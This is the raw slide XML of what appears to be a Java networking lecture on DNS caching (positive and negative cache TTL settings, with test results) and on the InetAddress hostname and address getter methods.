            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Analysis </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>address1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>took 238</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t> ms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t> to throw an exception, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>and address2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>took </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>0 ms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t> to throw an exception. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>,e </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>address2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>obtained the information that the domain name </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>www123456789nonexistent.com </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>is inaccessible from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>the DNS cache </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>, so it directly threw the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>UnknowHostException </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>exception </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Test </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>: disable negative caching</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>int </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>negativeCacheTTL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = 0; // Change this value to test different durations</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Security.setProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>networkaddress.cache.negative.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>", </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>String.valueOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>negativeCacheTTL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>));</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Analysis: Negetive caching is disabled</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>, so address2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>still needs to access </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>the DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>server to know that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>www.123456com </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>is an inaccessible domain name.</a:t>
            </a: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2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>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p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="3" name="直接连接符 2"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5638800" y="5410200"/>
            <a:ext cx="685800" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="50800" algn="ctr">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Picture 9"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="123825" y="4114800"/>
            <a:ext cx="8782050" cy="2057398"/>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42900" y="614065"/>
            <a:ext cx="11506200" cy="6001643"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1. Positive Cache (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>networkaddress.cache.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Default Behavior:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Java 7 and earlier: Cache forever (-1)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Java 8+: Respect DNS TTL (0)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Recommended Setting:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>// Set to 30-60 seconds for most applications</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>Security.setProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>networkaddress.cache.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>", "30");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Rationale: Balances performance with DNS record freshness</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Never use -1: Creates security risks and breaks dynamic DNS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2. Negative Cache (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>networkaddress.cache.negative.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Default: 10 seconds</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Recommended Setting: // Set to 10-30 seconds maximum</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>Security.setProperty</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>networkaddress.cache.negative.ttl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>", "10");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Never use -1: Would permanently block access to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>temporarily unavailable domains</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3657600" y="152400"/>
            <a:ext cx="5601213" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS Cache Configuration Guidelines</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" u="sng" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>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6. Hostname/Domain Acquisition Methods</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Teaching Objective:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Contrast </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>getHostName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>() (reverse DNS) with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>getCanonicalHostName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>() (full FQDN).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Use these methods for logging or access control.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Practical Outcome:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Students can extract and validate hostnames from logs or user inputs.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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1479003" y="152400"/>
            <a:ext cx="8540750" cy="762000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="4000" b="1" dirty="0"/>
              <a:t>Getter Methods</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="4000" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41987" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1066801"/>
            <a:ext cx="11430000" cy="5486399"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>The four getter methods can return the host name as a string </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>or</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>address as a string </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>or</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" dirty="0"/>
              <a:t> a byte array.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>String getHostName()</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>Returns the host name and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>String getCanonicalHostName()</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>Query </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>and return the host name and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>Byte[] getAddress()</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>Returns </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>, byte type, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IPv4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IPv6</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>String getHostAddress()</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>Returns </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>, string type, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IPv4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" dirty="0"/>
              <a:t>or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" dirty="0"/>
              <a:t>IPv6</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-C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152400" y="914400"/>
            <a:ext cx="11811000" cy="2135969"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="folHlink"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>getHostName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>() method is used to resolve the hostname associated with an IP address </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:schemeClr val="folHlink"/>
              </a:buClr>
              <a:buSzPct val="85000"/>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>Performs a reverse DNS lookup to find the hostname of an IP address.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="800100" lvl="1" indent="-342900" eaLnBrk="1" hangingPunct="1">
